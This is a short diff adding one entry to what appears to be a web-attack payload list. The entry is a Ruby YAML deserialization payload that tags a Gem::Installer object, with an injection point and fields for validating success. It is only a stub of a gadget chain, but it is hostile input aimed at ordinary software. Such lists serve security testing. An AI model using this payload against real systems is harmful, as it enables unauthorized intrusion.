@@ -1,0 +1,13 @@
+[
+  {
+    "payload_id": "OWP-0681",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Ruby",
+    "injection_point": "body_yaml",
+    "payload_string": "--- !ruby/object:Gem::Installer\\ni: x",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
